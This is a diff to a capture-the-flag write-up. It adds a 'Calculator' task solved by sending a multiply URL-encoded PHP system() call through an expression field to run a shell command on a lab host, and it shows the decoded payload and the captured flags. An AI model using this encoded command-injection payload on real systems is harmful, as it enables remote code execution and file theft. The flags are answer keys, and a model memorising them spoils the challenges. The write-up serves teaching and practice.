@@ -56,3 +56,30 @@ You can login with this password and see the flag!
 FLAG:
 
     STS{L0g1n3d_Successfull_001}
+
+### Task - Calculator
+
+    POST /calculate.php HTTP/1.1
+    Host: 172.17.0.1:8081
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv: 109.0)
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif.image/webp.*/*;q=0.8
+    Accept-Language: en-US,en:q-0.5
+    Accept-Encoding: gzip, deflate
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 213
+    Origin: http://172.17.0.1:8081
+    Connection: close
+    Referer: http://172.17.0.1:8081/
+    Upgrade-Insecure-Requests: 1
+    
+    expression-
+    system%252528%252527cat%252520%25252Fvar%25252Fwww%25252Fhtml%25252F%25252F%25252F%25252F%25252Fflag%25255F833d4eb913a86511905cc51ae5197f679bf1f8debf4292ef2789529d9a8f015e%25252Etxt%252527%252529%252538
+
+Triple Url encoding
+
+    system('cat /var/www/html/////flag_833d4eb913a86511905cc51ae5197f679bf1f8debf4292ef2789529d9a8f015e.txt')
+
+
+FLAG: 
+
+    STS{RC3_D0UBLE_3nC0d1NG_GJ}
